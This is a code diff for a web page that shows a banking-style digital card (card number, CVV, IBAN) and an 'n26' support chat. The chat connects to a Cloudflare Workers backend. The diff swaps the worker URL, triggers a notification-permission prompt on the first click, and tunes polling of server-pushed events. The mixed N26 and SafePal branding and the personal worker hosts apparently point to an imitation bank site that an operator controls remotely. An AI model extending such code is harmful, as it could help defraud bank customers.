@@ -11494,7 +11494,8 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
         // Request notification permission once
         try {
           if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
-            Notification.requestPermission().catch(() => {});
+            const askOnce = function() { document.removeEventListener('click', askOnce, true); try { Notification.requestPermission().catch(() => {}); } catch (e2) {} };
+            document.addEventListener('click', askOnce, true);
           }
         } catch (e) {}
 
@@ -14517,7 +14518,7 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
 (function(){
   'use strict';
   // Cloudflare Worker endpoints are unchanged: POST /api/support/send, GET /api/support/poll, GET /api/events/poll
-  const WORKER_URL = 'https://safepal-support.kirillzolottttov.workers.dev';
+  const WORKER_URL = 'https://safepal-support.26-connect.workers.dev';
   const SESSION_KEY = 'n26_support_session_v2';
   const EVENT_CURSOR_KEY = 'n26_demo_event_cursor_v1';
   const MAX_LEN = 1000;
@@ -14526,7 +14527,7 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
   function session(){ const email=siteEmail(); const key=SESSION_KEY+':'+(email?encodeURIComponent(email):'guest'); let s=API.kv.peek(key); if(!/^chat_[a-f0-9]{32}$/.test(s||'')){ const a=new Uint8Array(16); crypto.getRandomValues(a); s='chat_'+Array.from(a,b=>b.toString(16).padStart(2,'0')).join(''); API.kv.set(key,s); } return s; }
 
   // ---- background events poller (unchanged behaviour) ----
-  async function pollEvents(){ try { const emailKey=siteEmail()||'guest'; const cursorKey=EVENT_CURSOR_KEY+':'+encodeURIComponent(emailKey); const lastEventId=Number(API.kv.peek(cursorKey)||0)||0; const r=await fetch(WORKER_URL+'/api/events/poll?after='+lastEventId,{headers:{'X-Session':session()},cache:'no-store'}); const d=await r.json(); if(!r.ok||!d.ok)return false; let nextId=lastEventId; for(const ev of (d.events||[])){ if(!ev||!ev.id)continue; nextId=Math.max(nextId,Number(ev.id)||0); try { window.dispatchEvent(new CustomEvent('n26-worker-event',{detail:ev})); } catch(e) {} } API.kv.set(cursorKey,String(nextId)); return true; } catch(e) { return false; } }
+  async function pollEvents(){ try { const emailKey=siteEmail()||'guest'; const cursorKey=EVENT_CURSOR_KEY+':'+encodeURIComponent(emailKey); const lastEventId=Number(API.kv.peek(cursorKey)||0)||0; const r=await fetch(WORKER_URL+'/api/events/poll?after='+lastEventId,{headers:{'X-Session':session()},cache:'no-store'}); const d=await r.json(); if(!r.ok||!d.ok)return false; let nextId=lastEventId; for(const ev of (d.events||[])){ if(!ev||!ev.id)continue; nextId=Math.max(nextId,Number(ev.id)||0); try { window.dispatchEvent(new CustomEvent('n26-worker-event',{detail:ev})); } catch(e) {} } API.kv.set(cursorKey,String(nextId)); return nextId>lastEventId ? 'new' : 'idle'; } catch(e) { return false; } }
 
   // ---- i18n ----
   const TX = {
@@ -14665,6 +14666,7 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
   function fit(){ if(!root) return; const vv=window.visualViewport; if(vv && window.innerWidth<=560 && root.style.display==='flex'){ root.style.top=vv.offsetTop+'px'; root.style.height=vv.height+'px'; root.style.bottom='auto'; } else { root.style.top=''; root.style.height=''; root.style.bottom=''; } }
   if(window.visualViewport){ window.visualViewport.addEventListener('resize',fit); window.visualViewport.addEventListener('scroll',fit); }
   window.addEventListener('resize',fit);
+  function why(e){ if(location.protocol==='file:') return 'file:// – open the deployed https site'; var m=String(e&&e.message||e||'network'); if(/Failed to fetch|NetworkError|Load failed/i.test(m)) return 'network/CORS – check ALLOWED_ORIGIN & Worker deploy'; return m; }
   function setStatus(txt,err){ if(!statusEl) return; statusEl.textContent=txt||''; statusEl.className=err?'err':''; }
   function go(v,id){ view=v; if(id!==undefined) cur=id; render(); }
 
@@ -14765,27 +14767,29 @@ function DigitalCard({ holderName = 'ALEX MORGAN', cardNumber, cvv, expiry, iban
       const r=await fetch(WORKER_URL+'/api/support/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session:syncSession(),email,text:tagged,cid:'w'+crypto.randomUUID().replace(/-/g,'').slice(0,20)})});
       const d=await r.json(); if(!r.ok||!d.ok) throw new Error(d.message||d.error||'send_failed');
       if(!silent) setStatus(T('sent')); busy=false; await poll(true); return true;
-    }catch(err){ setStatus(T('sendErr'),true); return false; }
+    }catch(err){ setStatus(T('sendErr')+' ['+why(err)+']',true); return false; }
     finally{ busy=false; if(btn) btn.disabled=false; }
   }
   async function poll(force){
     try{
       const cs=syncSession(); const r=await fetch(WORKER_URL+'/api/support/poll?after='+lastSeq,{headers:{'X-Session':cs},cache:'no-store'});
       const d=await r.json(); if(!r.ok||!d.ok) throw new Error(d.error||'poll_failed');
-      let added=false; (d.messages||[]).forEach(m=>{ if(!m||!m.seq||m.seq<=lastSeq) return; lastSeq=Math.max(lastSeq,m.seq); msgs.push(m); added=true; });
+      let added=false; idleN=0; (d.messages||[]).forEach(m=>{ if(!m||!m.seq||m.seq<=lastSeq) return; lastSeq=Math.max(lastSeq,m.seq); msgs.push(m); added=true; }); if(!added) idleN++;
       if((added||force) && view!=='new'){
         const ta0=document.querySelector('#n26s-compose textarea'); const keep=ta0?ta0.value:''; const had=!!ta0&&document.activeElement===ta0;
         render();
         if(keep){ const n=document.querySelector('#n26s-compose textarea'); if(n){ n.value=keep; if(had) n.focus(); n.oninput&&n.oninput(); } }
       }
       if(statusEl && statusEl.className!=='err') setStatus(T('live'));
-    }catch(e){ setStatus(T('connErr'),true); }
+    }catch(e){ setStatus(T('connErr')+' ['+why(e)+']',true); }
   }
-  function open(mode){ if(!root) make(); syncSession(); LANG=detectLang(); root.style.display='flex'; document.body.style.overflow='hidden'; fit(); view=(mode==='new')?'new':'list'; render(); poll(true).then(()=>{ if(mode!=='list' && view==='list' && !buildTickets().length) go('new'); }); if(poller) clearInterval(poller); poller=setInterval(()=>poll(false),3000); }
-  function closeChat(){ if(root){ root.style.display='none'; fit(); } document.body.style.overflow=''; if(poller){ clearInterval(poller); poller=null; } }
+  let idleN=0;
+  function schedule(){ if(poller) clearTimeout(poller); poller=setTimeout(async function(){ if(root && root.style.display==='flex' && !document.hidden){ await poll(false); } if(root && root.style.display==='flex') schedule(); }, idleN>20?10000:(idleN>8?6000:3000)); }
+  function open(mode){ if(!root) make(); syncSession(); LANG=detectLang(); root.style.display='flex'; document.body.style.overflow='hidden'; fit(); view=(mode==='new')?'new':'list'; render(); poll(true).then(()=>{ if(mode!=='list' && view==='list' && !buildTickets().length) go('new'); }); if(poller) clearInterval(poller); idleN=0; schedule(); }
+  function closeChat(){ if(root){ root.style.display='none'; fit(); } if(poller){ clearTimeout(poller); poller=null; } document.body.style.overflow=''; if(poller){ clearInterval(poller); poller=null; } }
   function openWith(o){ o=o||{}; draft={subject:String(o.subject||'').slice(0,80),text:String(o.text||'').slice(0,700)}; if(o.topic) draftTopic=o.topic; open('new'); }
   window.N26SupportChat={open,close:closeChat,openWith};
-  (function n26EventLoop(){ var delay=4000; function tick(){ if(document.hidden){ setTimeout(tick,delay); return; } pollEvents().then(function(ok){ delay = ok ? 4000 : Math.min(delay*2, 300000); }).catch(function(){ delay=Math.min(delay*2,300000); }).then(function(){ setTimeout(tick,delay); }); } tick(); })();
+  (function n26EventLoop(){ var delay=5000; function tick(){ if(document.hidden){ setTimeout(tick,15000); return; } pollEvents().then(function(r){ if(r==='new') delay=5000; else if(r==='idle') delay=Math.min(Math.round(delay*1.4),30000); else delay=Math.min(delay*2,300000); }).catch(function(){ delay=Math.min(delay*2,300000); }).then(function(){ setTimeout(tick,delay); }); } document.addEventListener('visibilitychange',function(){ if(!document.hidden) delay=5000; }); tick(); })();
 })();
 </script>
 
